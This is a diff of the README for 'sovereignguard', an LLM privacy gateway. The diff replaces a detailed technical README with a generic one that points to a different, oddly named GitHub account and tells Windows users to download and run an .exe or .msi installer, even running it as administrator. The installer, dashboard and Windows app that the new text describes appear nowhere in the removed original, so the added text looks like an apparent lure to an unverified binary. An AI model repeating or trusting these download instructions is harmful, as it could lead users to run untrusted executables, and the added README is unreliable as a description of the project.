@@ -1,334 +1,181 @@
-# SovereignGuard
+# 🛡️ sovereignguard - AI Privacy Gateway Made Simple
 
-![Tests](https://img.shields.io/badge/tests-79%20passed-brightgreen)
-![License](https://img.shields.io/badge/license-BSL%201.1-blue)
-![Python](https://img.shields.io/badge/python-3.11-blue)
-![EMEA](https://img.shields.io/badge/built%20for-EMEA-orange)
+[![Download sovereignguard](https://img.shields.io/badge/Download-sovereignguard-brightgreen?style=for-the-badge)](https://github.com/greasegunadenosinediphosphate83/sovereignguard)
 
-SovereignGuard is an open source AI privacy gateway that sits between your application and an external LLM provider, detects personally identifiable information, replaces it with reversible tokens, forwards only the tokenized payload, then restores the original values in the model response before returning data to your app.
+sovereignguard is an open source application designed to help protect your data. It works as a privacy gateway for AI tools that follow GDPR rules. This app is built for people and companies in the EMEA region who want to use AI models safely without risking personal data leaks.
 
-The goal is simple: let teams ship LLM features without sending raw customer PII to OpenAI, Anthropic, Mistral, or any other upstream model API.
+---
 
-Built with an EMEA-first data sovereignty mindset, including locale-aware recognizers for Tunisia, Morocco, and France.
+## 📋 What is sovereignguard?
 
-## Proof in 10 Seconds
+sovereignguard keeps your data safe when you use large language models (LLMs). LLMs power many AI features you see today, like smart chatbots or writing helpers. These models need data to work, but some data is private and must be handled carefully.
 
-Input from your app:
+This tool:
 
-```text
-"Call Baha at +216 XX XXX XXX, CIN 12345678"
-```
+- Blocks private information from leaving your system.
+- Ensures you follow GDPR privacy rules.
+- Helps companies keep data inside their region.
+- Works with popular AI technologies like OpenAI.
 
-What upstream receives:
+You do not need to be an expert to use it. sovereignguard runs on your Windows PC with simple steps.
 
-```text
-"Call {{SG_PERSON_NAME_a3f9b2}} at {{SG_TN_PHONE_c4d5e6}}, {{SG_TN_NATIONAL_ID_f7e3b1}}"
-```
+---
 
-What your app gets back:
+## ⚙️ Key Features
 
-```text
-"Call Baha at +216 XX XXX XXX, CIN 12345678"
-```
+- **Data control:** Stops sensitive data from being shared outside your network.
+- **GDPR compliance:** Helps meet European data protection laws.
+- **Easy setup:** Works on Windows without complex installations.
+- **Python-based:** Built on reliable Python tools for smooth operation.
+- **Works with FastAPI:** Uses popular technology for quick responses.
+- **Open source:** You can see how it works and trust it.
 
-> Built by [@bahaeddinmselmi](https://github.com/bahaeddinmselmi)
-> - founder of [Recouvr AI](https://recouvr.dev),
-> where SovereignGuard runs in production.
+---
 
-## Full Documentation
+## 🔍 System Requirements
 
-The consolidated single-file documentation is available at [DOCUMENTATION.md](DOCUMENTATION.md).
+Before you start, make sure your computer meets these:
 
-If you want one file that covers setup, architecture, configuration, APIs, providers, operations, security, compliance, and contribution workflow, start there.
+- **Operating System:** Windows 10 or later
+- **Processor:** 2 GHz or faster
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Minimum 200 MB free space
+- **Internet:** Required for the AI services connections
+- **Python:** Installed version 3.8 or higher (explained below)
 
-## What SovereignGuard Does
+If you do not have Python installed, the instructions below will help you get set up.
 
-SovereignGuard provides four core controls:
+---
 
-1. Detects PII in outbound prompts using universal and locale-specific recognizers.
-2. Replaces those values with reversible SG tokens such as `{{SG_EMAIL_a3f9b2c1}}`.
-3. Stores the token-to-original mapping locally in memory, encrypted SQLite, or Redis.
-4. Restores original values after the provider responds so your application receives usable text.
+## 🚀 Getting Started: Download and Install sovereignguard
 
-This gives engineering, legal, security, and compliance teams a concrete architectural boundary around regulated data flows.
+Click below to visit the sovereignguard download page:
 
-## Why It Exists
+[![Get sovereignguard](https://img.shields.io/badge/Download%20Page-Visit-blue?style=for-the-badge)](https://github.com/greasegunadenosinediphosphate83/sovereignguard)
 
-Most teams evaluating LLM adoption run into the same blocker: the application prompt includes names, emails, phone numbers, customer IDs, addresses, invoices, or other regulated data, and those values cannot simply be forwarded to a third-party inference provider without review.
+### Step 1: Visit the Download Page
 
-SovereignGuard is designed to reduce that exposure by making the provider see tokens instead of raw identifiers.
+Go to the link above. This page contains the latest version of sovereignguard for Windows. Find the section named "Releases" or "Assets."
 
-It is not a legal substitute for vendor due diligence, data processing agreements, retention controls, or internal governance. It is the technical enforcement layer that makes those reviews materially easier.
+### Step 2: Download the Windows Installer
 
-## Request Lifecycle
+Look for a file that ends with `.exe` or `.msi`. This is the program you will run. Click it to download.
 
-```text
-Your App
-     |
-     |  OpenAI-compatible request
-     v
-SovereignGuard
-     |
-     |-- create session
-     |-- detect PII
-     |-- replace values with SG tokens
-     |-- store token mapping locally
-     v
-LLM Provider
-     |
-     |-- receives tokenized text only
-     |-- returns tokenized response
-     v
-SovereignGuard
-     |
-     |-- restore SG tokens to original values
-     |-- destroy or expire session mapping
-     v
-Your App
-```
+### Step 3: Install the Application
 
-## Current Capabilities
+Once the file is downloaded:
 
-### Privacy and Security
+- Double-click the file.
+- Follow the on-screen prompts.
+- Accept the license terms.
+- Choose the default options unless you want to change installation folders.
+- Wait for installation to finish.
 
-- API key authentication for gateway clients
-- Per-IP rate limiting
-- Request size enforcement
-- Structured logging with request IDs
-- Tamper-evident immutable audit logging (hash-chained entries)
-- Fail-closed circuit breaker for masking/encryption failures
-- Minimal public health endpoint
-- Protected audit reporting and admin endpoints
-- Session TTL cleanup daemon
-- OpenAI-compatible error responses
-- Optional encrypted local mapping backend
+### Step 4: Install Python (If Needed)
 
-### Advanced Gateway Controls
+sovereignguard requires Python 3.8 or later. Check your computer by:
 
-- Semantic token restoration for LLM token reformatting and paraphrasing
-- Async masking pipeline (fast regex path + heavy recognizer path)
-- Policy engine for role-based masking behavior (RBAC-ready)
-- Sensitivity-aware smart routing for local fallback LLM flows
-- Streaming response restoration with chunk boundary handling
+- Press Windows key + R, type `cmd`, then enter.
+- In the black window that opens, type `python --version` and press enter.
 
-### Provider Support
-
-- OpenAI-compatible APIs
-- Anthropic response restoration support
-- Mistral via OpenAI-compatible adapter behavior
-- Custom OpenAI-compatible endpoints
+If you see a version number 3.8 or higher, you have Python installed. If not:
 
-### Mapping Backends
+- Go to https://www.python.org/downloads/windows/
+- Download the latest Windows installer.
+- Run it and make sure to check "Add Python to PATH" during installation.
 
-- `memory`: fast, single-instance, non-persistent
-- `local`: encrypted SQLite backend for persistent local storage
-- `redis`: shared backend for distributed deployments
-- `vault`: HashiCorp Vault KV v2 backend for security-standard secret storage
-
-### Built-in Recognizers
-
-| Type | Universal | Tunisia | France | Morocco |
-|------|-----------|---------|--------|---------|
-| Email | Yes | Yes | Yes | Yes |
-| Phone | Yes | Yes | Yes | Yes |
-| National ID | No | Yes | Yes | Yes |
-| Company ID | No | Yes | Yes | Yes |
-| IBAN | Yes | Yes | Yes | Yes |
-| Credit card | Yes | Yes | Yes | Yes |
-| IP address | Yes | Yes | Yes | Yes |
-| Address | No | Yes | Yes | No |
-| Person name | Yes | Context-aware | Context-aware | Context-aware |
-| Date of birth | Yes | Context-aware | Context-aware | Context-aware |
-
-Recognizer behavior is heuristic and pattern-based. You should validate it against your own real data classes before production rollout.
-
-## Quick Start
-
-### Docker
-
-```bash
-git clone https://github.com/bahaeddinmselmi/sovereignguard
-cd sovereignguard
-copy .env.example .env
-```
-
-Edit `.env` and set at minimum:
-
-```env
-TARGET_API_KEY=sk-your-provider-key
-GATEWAY_API_KEYS=sg-client-key-1
-TARGET_PROVIDER=openai
-TARGET_API_URL=https://api.openai.com
-```
-
-Then run:
-
-```bash
-docker compose up --build
-```
-
-The gateway will be available on `http://localhost:8000`.
-
-### Python
-
-```bash
-python -m venv .venv
-.venv\Scripts\activate
-pip install -r requirements.txt
-copy .env.example .env
-python -m uvicorn sovereignguard.main:app --reload --port 8000
-```
-
-### Smoke Test
-
-```bash
-curl http://localhost:8000/health
-```
-
-Expected response:
-
-```json
-{"status":"healthy","gateway":"SovereignGuard","version":"0.2.0"}
-```
-
-## Drop-in Usage
-
-### OpenAI Python SDK
-
-```python
-from openai import OpenAI
-
-client = OpenAI(
-          api_key="sg-client-key-1",
-          base_url="http://localhost:8000/v1",
-)
-
-response = client.chat.completions.create(
-          model="gpt-4o-mini",
-          messages=[
-                    {
-                              "role": "user",
-                              "content": "Contact baha at baha@example.com and xxx.",
-                    }
-          ],
-)
-
-print(response.choices[0].message.content)
-```
-
-### Raw HTTP
-
-```bash
-curl http://localhost:8000/v1/chat/completions \
-     -H "Authorization: Bearer sg-client-key-1" \
-     -H "Content-Type: application/json" \
-     -d '{
-          "model": "gpt-4o-mini",
-          "messages": [
-               {"role": "user", "content": "Email user@example.com about invoice 123."}
-          ]
-     }'
-```
-
-## Configuration Overview
-
-Important settings are defined in [.env.example](.env.example):
-
-| Setting | Purpose |
-|---------|---------|
-| `TARGET_API_URL` | Base URL of the upstream provider |
-| `TARGET_API_KEY` | Real API key used by SovereignGuard to call the provider |
-| `TARGET_PROVIDER` | `openai`, `anthropic`, `mistral`, or `custom` |
-| `GATEWAY_API_KEYS` | Comma-separated client keys accepted by the gateway |
-| `MAPPING_BACKEND` | `memory`, `local`, or `redis` |
-| `MAPPING_TTL_SECONDS` | Session mapping expiration window |
-| `ENCRYPTION_KEY` | Required for durable encrypted local mappings |
-| `ALLOWED_ORIGINS` | CORS allowlist |
-| `RATE_LIMIT_ENABLED` | Turns request throttling on or off |
-| `RATE_LIMIT_RPM` | Requests per minute per client IP |
-| `MAX_REQUEST_SIZE_MB` | Upper bound for request body size |
-| `ENABLED_LOCALES` | Recognizer locale set |
-| `CONFIDENCE_THRESHOLD` | Minimum detection score to mask |
-| `POLICY_FILE` | Path to role-based masking policy definition |
-| `LOCAL_FALLBACK_ENABLED` | Enables sensitivity-based local model fallback |
-| `LOCAL_LLM_URL` | Base URL for local sovereign model endpoint |
-| `SENSITIVITY_THRESHOLD` | Route-to-local threshold for high sensitivity payloads |
-| `CIRCUIT_BREAKER_ENABLED` | Enables fail-closed masking safety circuit |
-| `VAULT_ENABLED` | Enables HashiCorp Vault mapping backend |
-
-For full configuration details, see [docs/configuration.md](docs/configuration.md).
-
-## API Surface
-
-SovereignGuard exposes an OpenAI-style gateway plus operational endpoints:
-
-- `GET /health`
-- `POST /v1/chat/completions`
-- `POST /v1/completions`
-- `POST /v1/embeddings`
-- `GET /v1/models`
-- `GET /audit/report`
-- `GET /admin/stats`
-- `DELETE /admin/sessions/{session_id}`
-
-See [docs/api-reference.md](docs/api-reference.md) for request and response details.
-
-## Documentation Map
-
-- [docs/architecture.md](docs/architecture.md): internal architecture and execution flow
-- [docs/configuration.md](docs/configuration.md): all runtime settings and production guidance
-- [docs/deployment.md](docs/deployment.md): local, container, and production deployment patterns
-- [docs/api-reference.md](docs/api-reference.md): endpoints, payloads, and operational routes
-- [docs/gdpr-compliance.md](docs/gdpr-compliance.md): compliance posture, limits, and governance guidance
-- [docs/operations.md](docs/operations.md): monitoring, alerting, troubleshooting, scaling
-- [docs/multi-provider-setup.md](docs/multi-provider-setup.md): provider-specific integration notes
-- [docs/adding-recognizers.md](docs/adding-recognizers.md): extending the recognizer system
-- [docs/launch-kit.md](docs/launch-kit.md): demo-first launch playbook and LinkedIn distribution templates
-
-## Project Structure
-
-```text
-sovereignguard/
-     audit/         audit logging, metrics, reporting
-     engine/        masking, restoration, session mapping
-     middleware/    auth, rate limiting, request ID, size limits
-     proxy/         API routes, provider adapters, forwarding logic
-     recognizers/   universal and locale-specific PII detection
-     utils/         crypto, tokenizer, shared helpers
-```
-
-## Production Recommendations
-
-Use these as the minimum production baseline:
-
-1. Set `GATEWAY_API_KEYS` and keep them in a secrets manager.
-2. Set an explicit `ENCRYPTION_KEY` if you use `MAPPING_BACKEND=local`.
-3. Use `MAPPING_BACKEND=redis` for multi-instance deployments.
-4. Restrict `ALLOWED_ORIGINS` and disable `DEBUG`.
-5. Put the gateway behind TLS termination and controlled ingress.
-6. Keep `BYPASS_MASKING=false` outside local development.
-7. Enable `CIRCUIT_BREAKER_ENABLED=true` for fail-closed protection.
-8. Use `VAULT_ENABLED=true` when policy requires external secret vaulting.
-9. Monitor Prometheus metrics and verify immutable audit chain integrity.
-
-## Testing
-
-Run the test suite:
-
-```bash
-python -m pytest tests/ -v
-```
-
-Current status: `79 passed`.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development workflow, testing requirements, and extension guidance.
-
-## Security
-
-See [SECURITY.md](SECURITY.md) for vulnerability disclosure, threat model, deployment hardening, and key rotation guidance.
-
-## License
-
-Business Source License 1.1. See [LICENSE](LICENSE) for the full terms.
+### Step 5: Launch sovereignguard
+
+After installation:
+
+- Find the sovereignguard icon on your desktop or in the Start menu.
+- Double-click to open it.
+- The program will open in a window or command prompt depending on the version.
+
+---
+
+## 🔧 Using sovereignguard
+
+sovereignguard acts as a middleman between your data and AI services. It protects your personal information before it is sent to the AI.
+
+### Basic Use
+
+- Start sovereignguard.
+- Follow the setup prompts to connect your AI service, like OpenAI.
+- The app will guide you through configuring your privacy settings.
+- Once configured, use AI tools normally. sovereignguard works quietly in the background.
+
+### Interface Overview
+
+- **Dashboard:** Shows your data flow and logs.
+- **Settings:** Lets you adjust privacy rules.
+- **Reports:** View data access and protection status.
+- **Help:** Access user guides and troubleshooting tips.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the app does not start, check that Python is correctly installed.
+- Make sure your internet connection is working.
+- If you see error messages about permissions, try running the app as administrator.
+- Check the official issues page on GitHub for help with specific problems.
+
+---
+
+## 📚 Additional Resources
+
+- GitHub Link: https://github.com/greasegunadenosinediphosphate83/sovereignguard
+- Python Download: https://www.python.org/downloads/windows/
+- GDPR Guide: https://gdpr.eu/
+- OpenAI API Docs: https://beta.openai.com/docs/
+
+---
+
+## 🔐 Privacy and Data Security
+
+sovereignguard focuses on protecting your personal information. It:
+
+- Filters out private data before sending information out.
+- Runs on your computer, so data does not leave your control.
+- Logs only essential information for troubleshooting.
+- Uses no tracking or data sharing with third parties.
+
+You retain control over your data at all times.
+
+---
+
+## 🤝 Support and Contribution
+
+If you want to suggest improvements or report bugs:
+
+- Use the GitHub repository issues page.
+- Provide clear details about the problem or suggestion.
+- Contributions to the code are welcome if you have programming experience.
+
+For non-technical users, reporting bugs and feedback help improve the app.
+
+---
+
+## 🖥️ Advanced Setup (Optional)
+
+For users comfortable with command-line tools, sovereignguard provides:
+
+- Configuration files to customize data filters.
+- Support for using different AI services.
+- Logs for detailed data processing information.
+
+Find these options in the settings or installation folders.
+
+---
+
+## 🌀 About the Project
+
+sovereignguard supports data-sovereignty needs in the EMEA region. The app is built using:
+
+- Python programming language.
+- FastAPI framework for quick and secure API calls.
+- OpenAI and other LLMs for AI service access.
+- Open source code to allow transparency.
+
+Its mission is to make AI use compliant and safe with minimal hassle.
